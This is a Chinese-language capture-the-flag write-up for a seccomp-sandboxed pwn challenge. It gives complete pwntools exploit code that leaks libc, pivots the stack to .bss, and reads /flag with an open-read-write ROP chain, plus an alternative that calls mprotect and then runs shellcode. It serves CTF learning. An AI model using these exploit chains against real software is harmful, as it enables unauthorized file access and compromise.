# orw

## 题目简述

程序通过 `prctl` 安装 seccomp 过滤器，禁止 `execve` 和 `execveat`，所以 `system("/bin/sh")` 这类依赖创建新进程的方案不可用。`vuln` 在 256 字节栈缓冲区中读取 `0x130` 字节，可覆盖保存的 `rbp` 和返回地址，但返回地址之后只剩 `0x28` 字节，放不下完整的 open-read-write ROP 链。解法是先泄漏 libc，再把栈迁移到 `.bss`，最后执行 ORW。

## 解题过程

### 确认沙盒与溢出

使用 `seccomp-tools dump ./vuln` 可还原规则：除 `execve`、`execveat` 命中 `KILL` 外，其余系统调用均放行。因此可以依次：

1. `open("/flag", 0)`；
2. `read(flag_fd, buffer, size)`；
3. `write(1, buffer, size)`。

漏洞函数等价于：

```c
ssize_t vuln(void) {
    char buf[256];
    return read(0, buf, 0x130);
}
```

二进制没有 Canary 和 PIE，NX 开启。覆盖偏移为 `0x100 + 8`；保存的 `rbp` 可配合 `leave; ret` 完成栈迁移。

### 第一阶段：泄漏 libc

第一条短 ROP 链调用 `puts(puts@GOT)`，再返回 `vuln` 接收后续数据：

```python
from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
io = remote("目标地址", 端口)

pop_rdi = 0x401393
leave_ret = 0x4012BE
vuln = elf.symbols["vuln"]
bss = 0x404060

stage1 = flat(
    b"A" * 0x100,
    bss + 0x200,          # 暂时覆盖保存的 rbp
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    vuln,
)
io.sendafter(b"\n", stage1)

puts_addr = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success(f"libc base: {libc.address:#x}")
```

### 第二、三阶段：把 ROP 链放入 `.bss`

第二次进入 `vuln` 时，覆盖保存的 `rbp` 为 `bss + 0x200`，返回到 `vuln + 0x0F`。该位置会再次执行读入，然后走到函数尾部的 `leave; ret`。第三次发送的数据从 `bss + 0x100` 开始；在偏移 `0x100` 处布置新的 `rbp` 和 `leave_ret`，即可把 `rsp` 最终迁移到 ORW 链开头。

```python
pop_rsi = libc.address + 0x2601F
pop_rdx = libc.address + 0x142C92

stage2 = flat(
    b"A" * 0x100,
    bss + 0x200,
    vuln + 0x0F,
)
io.send(stage2)

flag_path = bss + 0x100       # 0x404160
read_buf = 0x404700

stage3 = flat(
    b"/flag\x00\x00\x00",

    pop_rdi, flag_path,
    pop_rsi, 0,
    libc.symbols["open"],

    # stdin/stdout/stderr 占用 0、1、2，open 通常返回 3。
    pop_rdi, 3,
    pop_rsi, read_buf,
    pop_rdx, 0x100,
    libc.symbols["read"],

    pop_rdi, 1,
    pop_rsi, read_buf,
    pop_rdx, 0x100,
    libc.symbols["write"],
)

stage3 = stage3.ljust(0x100, b"A")
stage3 += flat(flag_path, leave_ret)
io.send(stage3)
io.interactive()
```

第三阶段执行后，flag 内容通过标准输出返回。

### 另一种路线：`mprotect` 后执行 ORW shellcode

官方 PDF 还给出第二种做法。泄漏 libc 和栈迁移步骤不变，把 `.bss` 所在页面 `0x404000` 改成 RWX，然后跳入紧随 ROP 链布置的 ORW shellcode：

```python
mprotect = libc.symbols["mprotect"]
shellcode_addr = 0x4041A8

chain = flat(
    0,
    pop_rdi, 0x404000,
    pop_rsi, 0x1000,
    pop_rdx, 7,
    mprotect,
    shellcode_addr,
)
chain += asm(shellcraft.open("/flag"))
chain += asm(shellcraft.read(3, 0x404500, 0x100))
chain += asm(shellcraft.write(1, 0x404500, 0x100))
```

该路线仍然没有调用被 seccomp 禁止的 `execve` 或 `execveat`。

## 方法总结

- 核心技巧：先读懂 seccomp 的允许/拒绝集合，再选择不依赖 shell 的 ORW 数据窃取链。
- 空间处理：栈上只能多写 `0x28` 字节时，用短链泄漏地址，并借保存的 `rbp` 与 `leave; ret` 把栈迁移到 `.bss`。
- 复用要点：ORW 可以用 libc 函数 ROP，也可以先 `mprotect` 再执行 shellcode；无论哪种方法，都要核对文件描述符、调用参数、栈迁移地址和目标内存权限。
